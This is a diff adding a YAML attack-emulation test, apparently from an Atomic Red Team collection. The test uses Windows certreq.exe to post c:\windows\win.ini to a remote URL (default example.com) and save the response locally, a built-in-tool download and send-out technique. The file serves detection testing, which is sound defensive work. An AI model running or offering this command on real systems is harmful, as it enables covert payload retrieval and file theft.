@@ -681,3 +681,22 @@ atomic_tests:
     cleanup_command: |
       del %TEMP%\redcanary.cab >nul 2>&1
     name: command_prompt
+
+- name: certreq download
+  description: Use certreq to download a file from the web
+  supported_platforms:
+  - windows
+  input_arguments:
+    local_path:
+      description: Local path to place file
+      type: String
+      default: '%temp%\Atomic-license.txt'
+    remote_file:
+      description: URL of file to copy
+      type: url
+      default: https://example.com
+  executor:
+    command: 'certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}'
+    cleanup_command: 'del #{local_path} >nul 2>&1'
+    name: command_prompt
+  
